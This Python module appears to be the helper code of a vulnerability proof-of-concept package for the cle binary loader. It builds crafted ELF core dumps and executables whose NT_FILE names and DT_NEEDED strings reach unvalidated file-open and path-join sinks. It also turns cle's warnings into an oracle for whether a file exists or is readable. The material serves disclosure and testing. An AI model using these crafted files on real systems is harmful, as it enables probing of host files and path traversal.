"""Shared builders and helpers for the cle PoC package.

Sinks demonstrated by this package (cle @ 9.2.99 release, unchanged at HEAD):

  S1  cle/backends/elf/elfcore.py:434   ELFCore.__reload_children
      open(filename, "rb") where `filename` comes verbatim from the NT_FILE note
      of the analyzed core dump. Unconditional: no flag, no validation.

  S2  cle/loader.py:1221 (Loader._possible_paths) with origin
      cle/backends/elf/elf.py:1059 (self.deps.append(tag.needed))
      os.path.join(libdir, spec) where `spec` is the raw DT_NEEDED string of the
      analyzed ELF. An absolute `spec` discards `libdir`; '..' components escape it.

All builders are deterministic and emit spec-conformant minimal ELF64 files via
struct.pack only. No network, no external tools, no randomness.
"""
import logging
import os
import struct

NT_FILE = 0x46494C45  # elf.h

# marker used by ingestion PoCs: placed in a victim ELF's PT_LOAD at MARKER_VADDR
MARKER = b"CLE-POC-MARKER-7f3a91c2\x00"
MARKER_VADDR = 0x2000


def _ehdr(e_type, phnum, phoff=64, shoff=0):
    return struct.pack(
        "<4sBBBBB7xHHIQQQIHHHHHH",
        b"\x7fELF", 2, 1, 1, 0, 0,  # ELF64, LE, SysV
        e_type, 62, 1,  # EM_X86_64
        0, phoff, shoff, 0,
        64, 56, phnum, 64, 0, 0,
    )


def _phdr(p_type, flags, offset, vaddr, filesz, memsz, align):
    return struct.pack("<IIQQQQQQ", p_type, flags, offset, vaddr, vaddr, filesz, memsz, align)


def _nt_file_note(entries, page_size=0x1000):
    """NT_FILE note blob: count, page_size, [vm_start, vm_end, page_offset]*, names."""
    desc = struct.pack("<QQ", len(entries), page_size)
    for vm_start, vm_end, page_offset, _name in entries:
        desc += struct.pack("<QQQ", vm_start, vm_end, page_offset)
    for _vm_start, _vm_end, _page_offset, name in entries:
        desc += name.encode() + b"\0"
    name = b"GNU\0"
    blob = struct.pack("<III", len(name), len(desc), NT_FILE) + name + desc
    return blob + b"\0" * (-len(blob) % 4)


def build_core(entries, out_path, base=0x400000):
    """ET_CORE with one PT_NOTE (NT_FILE naming `entries`) + one PT_LOAD covering
    the declared vm range (required so __reload_children's clemory read succeeds)."""
    note = _nt_file_note(entries)
    note_off, load_sz = 64 + 2 * 56, 0x1000
    load_off = note_off + len(note)
    data = _ehdr(4, 2) + _phdr(4, 4, note_off, base, len(note), len(note), 4)
    data += _phdr(1, 5, load_off, base, load_sz, load_sz, 0x1000)
    data += note + b"A" * load_sz
    with open(out_path, "wb") as f:
        f.write(data)


def build_victim_elf(out_path, payload=MARKER, payload_vaddr=MARKER_VADDR):
    """Minimal loadable ET_DYN. Layout: [0,0x1000) headers+pad, PT_LOAD file 0x1000
    -> vaddr 0, so `payload_vaddr` maps to file offset payload_vaddr + 0x1000 and
    survives outside the page the core overwrites."""
    body = bytearray(b"\x00" * (payload_vaddr + len(payload)))
    body[payload_vaddr : payload_vaddr + len(payload)] = payload
    total = 0x1000 + len(body)
    with open(out_path, "wb") as f:
        f.write(_ehdr(3, 1))
        f.write(_phdr(1, 5, 0x1000, 0, len(body), len(body), 0x1000))
        f.write(b"\x00" * (0x1000 - 120))
        f.write(bytes(body))
    return out_path


def build_dyn_exe(needed_specs, out_path):
    """Minimal ET_DYN with PT_DYNAMIC: DT_NEEDED per spec string, DT_STRTAB/DT_STRSZ."""
    strtab = b"\0"
    offs = []
    for s in needed_specs:
        offs.append(len(strtab))
        strtab += s.encode() + b"\0"
    dyn_off = 64 + 2 * 56  # ehdr + PT_LOAD + PT_DYNAMIC headers
    n_ent = len(offs) + 3
    str_off = dyn_off + 16 * n_ent
    total = str_off + len(strtab)
    dyn = b""
    for off in offs:
        dyn += struct.pack("<qQ", 1, off)  # DT_NEEDED
    dyn += struct.pack("<qQ", 5, str_off)  # DT_STRTAB (vaddr == offset: identity map)
    dyn += struct.pack("<qQ", 10, len(strtab))  # DT_STRSZ
    dyn += struct.pack("<qQ", 0, 0)  # DT_NULL
    with open(out_path, "wb") as f:
        f.write(_ehdr(3, 2) + _phdr(1, 5, 0, 0, total, total, 0x1000))
        f.write(_phdr(2, 6, dyn_off, dyn_off, 16 * n_ent, 16 * n_ent, 8))
        f.write(dyn + strtab)
    return out_path


def capture_elfcore_warnings(loader_fn):
    """Run loader_fn() capturing cle.backends.elf.elfcore WARNING+ messages."""
    recs = []

    class _Cap(logging.Handler):
        def emit(self, record):
            recs.append(record.getMessage())

    lg = logging.getLogger("cle.backends.elf.elfcore")
    h = _Cap()
    lg.addHandler(h)
    lg.setLevel(logging.WARNING)
    try:
        loader_fn()
    finally:
        lg.removeHandler(h)
    return recs


def classify_ntfile_warning(msgs):
    """Map captured warnings to the oracle outcome for the probed path.

    Order matters: 'Could not find a compatible loader' and 'Could not load' both
    end with 'this core may be incomplete'.
    """
    for m in msgs:
        if "does not exist on the current system" in m:
            return "NOT_FOUND"
        if "Could not find a compatible loader for" in m:
            return "EXISTS_READABLE"  # only reachable after open() succeeded
        if "Could not load" in m:
            return "DENIED"
    return "NO_SIGNAL"
